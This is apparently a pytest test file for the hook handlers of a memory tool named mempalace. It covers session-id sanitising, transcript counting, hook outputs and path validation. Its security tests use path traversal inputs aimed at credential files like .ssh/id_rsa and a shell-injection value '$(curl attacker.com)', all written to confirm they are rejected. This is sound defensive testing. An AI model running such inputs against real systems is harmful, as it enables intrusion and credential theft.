import contextlib
import io
import json
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from mempalace.hooks_cli import (
    SAVE_INTERVAL,
    STOP_BLOCK_REASON,
    _count_human_messages,
    _get_mine_dir,
    _log,
    _maybe_auto_ingest,
    _parse_harness_input,
    _sanitize_session_id,
    _validate_transcript_path,
    hook_stop,
    hook_session_start,
    hook_precompact,
    run_hook,
)


# --- _sanitize_session_id ---


def test_sanitize_normal_id():
    assert _sanitize_session_id("abc-123_XYZ") == "abc-123_XYZ"


def test_sanitize_strips_dangerous_chars():
    assert _sanitize_session_id("../../etc/passwd") == "etcpasswd"


def test_sanitize_empty_returns_unknown():
    assert _sanitize_session_id("") == "unknown"
    assert _sanitize_session_id("!!!") == "unknown"


# --- _count_human_messages ---


def _write_transcript(path: Path, entries: list[dict]):
    with open(path, "w", encoding="utf-8") as f:
        for entry in entries:
            f.write(json.dumps(entry) + "\n")


def test_count_human_messages_basic(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "hello"}},
            {"message": {"role": "assistant", "content": "hi"}},
            {"message": {"role": "user", "content": "bye"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 2


def test_count_skips_command_messages(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
            {"message": {"role": "user", "content": "real question"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_handles_list_content(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": [{"type": "text", "text": "hello"}]}},
            {
                "message": {
                    "role": "user",
                    "content": [{"type": "text", "text": "<command-message>x</command-message>"}],
                }
            },
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_missing_file():
    assert _count_human_messages("/nonexistent/path.jsonl") == 0


def test_count_empty_file(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    assert _count_human_messages(str(transcript)) == 0


def test_count_malformed_json_lines(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text('not json\n{"message": {"role": "user", "content": "ok"}}\n')
    assert _count_human_messages(str(transcript)) == 1


# --- hook_stop ---


def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
    """Run a hook and capture its JSON stdout output."""
    import io

    buf = io.StringIO()
    patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
    if state_dir:
        patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
    with contextlib.ExitStack() as stack:
        for p in patches:
            stack.enter_context(p)
        hook_fn(data, harness)
    return json.loads(buf.getvalue())


def test_stop_hook_passthrough_when_active(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": True, "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_when_active_string(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": "true", "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_below_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL - 1)],
    )
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    assert result == {}


def test_stop_hook_silent_at_interval(tmp_path):
    """Default (no MEMPAL_VERBOSE): mine in background, never block the AI."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    # Silent mode (default) — interval reached but we don't block
    assert result == {}


def test_stop_hook_blocks_in_verbose_mode(tmp_path):
    """MEMPAL_VERBOSE=true → block and show diary reason in chat."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    with patch.dict("os.environ", {"MEMPAL_VERBOSE": "true"}):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert result["decision"] == "block"
    assert result["reason"] == STOP_BLOCK_REASON


def test_stop_hook_tracks_save_point(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    data = {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)}

    # First call — interval reached, silent mode → passes through
    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert result == {}

    # Second call with same count → also passes through (already saved)
    result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert result == {}


# --- hook_session_start ---


def test_session_start_passes_through_without_opt_in(tmp_path, monkeypatch):
    """Without MEMPAL_SESSION_START, session start stays a no-op — no tokens,
    no palace access, no risk of breaking startup if the palace is weird."""
    monkeypatch.delenv("MEMPAL_SESSION_START", raising=False)
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


def test_session_start_opt_in_without_palace_is_noop(tmp_path, monkeypatch):
    """When enabled but the palace can't be opened, degrade silently to {}
    rather than injecting an error message or blocking the session."""
    monkeypatch.setenv("MEMPAL_SESSION_START", "1")

    # Force _build_session_start_context down the no-palace path
    def boom_get_collection(*args, **kwargs):
        raise RuntimeError("palace missing")

    monkeypatch.setattr("mempalace.palace.get_collection", boom_get_collection)
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


def test_session_start_opt_in_with_empty_diary_is_noop(tmp_path, monkeypatch):
    """Opt-in + palace exists but no diary entries → no wake-up block."""
    monkeypatch.setenv("MEMPAL_SESSION_START", "1")

    class _EmptyCol:
        def get(self, **kwargs):
            return {"documents": [], "metadatas": []}

    monkeypatch.setattr("mempalace.palace.get_collection", lambda *a, **k: _EmptyCol())
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


def test_session_start_opt_in_injects_recent_diary_entries(tmp_path, monkeypatch):
    """Opt-in + diary entries → additionalContext with the 5 most recent
    entries, newest first, formatted as a short wake-up block."""
    monkeypatch.setenv("MEMPAL_SESSION_START", "1")

    # 7 entries spanning 2 wings; top-5 by filed_at should come back
    entries = [
        (
            "older still — skipped",
            {
                "wing": "wing_alice",
                "room": "diary",
                "topic": "old",
                "filed_at": "2026-01-01T00:00:00",
            },
        ),
        (
            "oldest — skipped too",
            {
                "wing": "wing_bob",
                "room": "diary",
                "topic": "older",
                "filed_at": "2025-12-01T00:00:00",
            },
        ),
        (
            "third newest",
            {
                "wing": "wing_alice",
                "room": "diary",
                "topic": "t3",
                "filed_at": "2026-04-15T09:00:00",
            },
        ),
        (
            "newest",
            {
                "wing": "wing_alice",
                "room": "diary",
                "topic": "t1",
                "filed_at": "2026-04-18T12:00:00",
            },
        ),
        (
            "second newest",
            {"wing": "wing_bob", "room": "diary", "topic": "t2", "filed_at": "2026-04-17T12:00:00"},
        ),
        (
            "fourth newest",
            {"wing": "wing_bob", "room": "diary", "topic": "t4", "filed_at": "2026-04-10T12:00:00"},
        ),
        (
            "fifth newest",
            {
                "wing": "wing_alice",
                "room": "diary",
                "topic": "t5",
                "filed_at": "2026-04-05T12:00:00",
            },
        ),
    ]

    class _Col:
        def get(self, **kwargs):
            # Ensure the hook actually filters to diary; return raw payload
            assert kwargs.get("where") == {"room": "diary"}
            return {
                "documents": [e[0] for e in entries],
                "metadatas": [e[1] for e in entries],
            }

    monkeypatch.setattr("mempalace.palace.get_collection", lambda *a, **k: _Col())

    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )

    assert "hookSpecificOutput" in result
    hso = result["hookSpecificOutput"]
    assert hso["hookEventName"] == "SessionStart"
    ctx = hso["additionalContext"]

    # Only top-5 by filed_at should appear, newest first
    assert "newest" in ctx
    assert "second newest" in ctx
    assert "third newest" in ctx
    assert "fourth newest" in ctx
    assert "fifth newest" in ctx
    # The older entries must be excluded
    assert "older still" not in ctx
    assert "oldest" not in ctx

    # Order: newest before second newest (by filed_at desc)
    assert ctx.index("newest") < ctx.index("second newest")
    # Wing names are surfaced without the 'wing_' prefix
    assert "alice" in ctx
    assert "bob" in ctx
    assert "wing_alice" not in ctx


# --- hook_precompact ---


def test_precompact_allows(tmp_path):
    result = _capture_hook_output(
        hook_precompact,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- _log ---


def test_log_writes_to_hook_log(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        _log("test message")
    log_path = tmp_path / "hook.log"
    assert log_path.is_file()
    content = log_path.read_text()
    assert "test message" in content


def test_log_oserror_is_silenced(tmp_path):
    """_log should not raise if the directory cannot be created."""
    with patch("mempalace.hooks_cli.STATE_DIR", Path("/nonexistent/deeply/nested/dir")):
        # Should not raise
        _log("this will fail silently")


# --- _maybe_auto_ingest ---


def test_maybe_auto_ingest_no_env(tmp_path):
    """Without MEMPAL_DIR or transcript_path, does nothing."""
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            _maybe_auto_ingest()  # should not raise


def test_maybe_auto_ingest_with_env(tmp_path):
    """With MEMPAL_DIR set to a valid directory, spawns subprocess."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                _maybe_auto_ingest()
                mock_popen.assert_called_once()


def test_maybe_auto_ingest_with_transcript(tmp_path):
    """Falls back to transcript directory when MEMPAL_DIR is not set."""
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                _maybe_auto_ingest(str(transcript))
                mock_popen.assert_called_once()


def test_maybe_auto_ingest_oserror(tmp_path):
    """OSError during subprocess spawn is silenced."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=OSError("fail")):
                _maybe_auto_ingest()  # should not raise


# --- _get_mine_dir ---


def test_get_mine_dir_mempal_dir(tmp_path):
    """MEMPAL_DIR takes priority over transcript_path."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        assert _get_mine_dir(str(transcript)) == str(mempal_dir)


def test_get_mine_dir_transcript_fallback(tmp_path):
    """Falls back to transcript parent dir when MEMPAL_DIR is not set."""
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        assert _get_mine_dir(str(transcript)) == str(tmp_path)


def test_get_mine_dir_empty():
    """Returns empty string when nothing is available."""
    with patch.dict("os.environ", {}, clear=True):
        assert _get_mine_dir("") == ""


# --- _parse_harness_input ---


def test_parse_harness_input_unknown():
    """Unknown harness should sys.exit(1)."""
    with pytest.raises(SystemExit) as exc_info:
        _parse_harness_input({"session_id": "test"}, "unknown-harness")
    assert exc_info.value.code == 1


def test_parse_harness_input_valid():
    result = _parse_harness_input(
        {"session_id": "abc-123", "stop_hook_active": True, "transcript_path": "/tmp/t.jsonl"},
        "claude-code",
    )
    assert result["session_id"] == "abc-123"
    assert result["stop_hook_active"] is True


# --- hook_stop with OSError on write ---


def test_stop_hook_oserror_on_last_save_read(tmp_path):
    """When last_save_file has invalid content, falls back to 0 — silent mode returns {}."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    # Write invalid content to last save file
    (tmp_path / "test_last_save").write_text("not_a_number")
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    # Silent mode (default) — interval reached, mine in background, no block
    assert result == {}


def test_stop_hook_oserror_on_write(tmp_path):
    """When write to last_save_file fails, hook still outputs correctly."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )

    def bad_write_text(*args, **kwargs):
        raise OSError("disk full")

    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch.object(Path, "write_text", bad_write_text):
            result = _capture_hook_output(
                hook_stop,
                {
                    "session_id": "test",
                    "stop_hook_active": False,
                    "transcript_path": str(transcript),
                },
                state_dir=tmp_path,
            )
    # Silent mode (default) — even with write error, hook returns {} not block
    assert result == {}


# --- hook_precompact with MEMPAL_DIR ---


def test_precompact_with_mempal_dir(tmp_path):
    """Precompact runs subprocess.run (sync) when MEMPAL_DIR is set."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test"},
                state_dir=tmp_path,
            )
    assert result == {}
    mock_run.assert_called_once()


def test_precompact_with_mempal_dir_oserror(tmp_path):
    """Precompact handles OSError from subprocess gracefully."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.subprocess.run", side_effect=OSError("fail")):
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test"},
                state_dir=tmp_path,
            )
    assert result == {}


def test_precompact_with_timeout(tmp_path):
    """Precompact handles TimeoutExpired gracefully -- still allows."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch(
            "mempalace.hooks_cli.subprocess.run",
            side_effect=subprocess.TimeoutExpired(cmd="mine", timeout=60),
        ):
            result = _capture_hook_output(
                hook_precompact, {"session_id": "test"}, state_dir=tmp_path
            )
    assert result == {}


def test_precompact_mines_transcript_dir(tmp_path, monkeypatch):
    """Precompact mines transcript directory when no MEMPAL_DIR."""
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    monkeypatch.delenv("MEMPAL_DIR", raising=False)
    with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
        result = _capture_hook_output(
            hook_precompact,
            {"session_id": "test", "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert result == {}
    mock_run.assert_called_once()
    # Verify mine dir is the transcript's parent
    call_args = mock_run.call_args[0][0]
    assert str(tmp_path) in call_args[-1]


# --- run_hook ---


def test_run_hook_dispatches_session_start(tmp_path):
    """run_hook reads stdin JSON and dispatches to correct handler."""
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_stop(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript, [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(3)]
    )
    stdin_data = json.dumps(
        {
            "session_id": "run-test",
            "stop_hook_active": False,
            "transcript_path": str(transcript),
        }
    )
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("stop", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_precompact(tmp_path):
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("precompact", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_unknown_hook():
    stdin_data = json.dumps({"session_id": "test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with pytest.raises(SystemExit) as exc_info:
            run_hook("nonexistent", "claude-code")
        assert exc_info.value.code == 1


def test_run_hook_invalid_json(tmp_path):
    """Invalid stdin JSON should not crash — falls back to empty dict."""
    with patch("sys.stdin", io.StringIO("not valid json")):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


# --- Security: transcript_path validation ---


def test_validate_transcript_rejects_path_traversal():
    """Paths with '..' components should be rejected."""
    assert _validate_transcript_path("../../etc/passwd") is None
    assert _validate_transcript_path("../../../.ssh/id_rsa") is None


def test_validate_transcript_rejects_wrong_extension():
    """Only .jsonl and .json extensions are accepted."""
    assert _validate_transcript_path("/tmp/transcript.txt") is None
    assert _validate_transcript_path("/tmp/secret.py") is None
    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None


def test_validate_transcript_accepts_valid_paths(tmp_path):
    """Valid .jsonl and .json paths should be accepted."""
    jsonl_path = tmp_path / "session.jsonl"
    jsonl_path.touch()
    result = _validate_transcript_path(str(jsonl_path))
    assert result is not None
    assert result.suffix == ".jsonl"

    json_path = tmp_path / "session.json"
    json_path.touch()
    result = _validate_transcript_path(str(json_path))
    assert result is not None
    assert result.suffix == ".json"


def test_validate_transcript_empty_string():
    """Empty transcript path should return None."""
    assert _validate_transcript_path("") is None


def test_count_rejects_traversal_path():
    """_count_human_messages should return 0 for path traversal attempts."""
    assert _count_human_messages("../../etc/passwd") == 0


def test_count_logs_warning_on_rejected_path(tmp_path):
    """_count_human_messages should log a warning when a non-empty path is rejected."""
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch("mempalace.hooks_cli._log") as mock_log:
            _count_human_messages("../../etc/passwd")
    mock_log.assert_called_once()
    assert "rejected" in mock_log.call_args[0][0].lower()


def test_validate_transcript_accepts_platform_native_path(tmp_path):
    """Validator accepts platform-native paths (backslashes on Windows, slashes on Unix)."""
    session_file = tmp_path / "projects" / "abc123" / "session.jsonl"
    session_file.parent.mkdir(parents=True)
    session_file.touch()
    # Use the OS-native string representation (backslashes on Windows)
    result = _validate_transcript_path(str(session_file))
    assert result is not None
    assert result.suffix == ".jsonl"
    assert result.is_file()


def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
    """stop_hook_active with shell injection string should not cause issues."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    # Simulate a malicious stop_hook_active value
    result = _capture_hook_output(
        hook_stop,
        {
            "session_id": "test",
            "stop_hook_active": "$(curl attacker.com)",
            "transcript_path": str(transcript),
        },
        state_dir=tmp_path,
    )
    # The injected value is not "true"/"1"/"yes", so the hook processes normally.
    # In silent mode (default), it returns {} — no block, no injection executed.
    assert result == {}
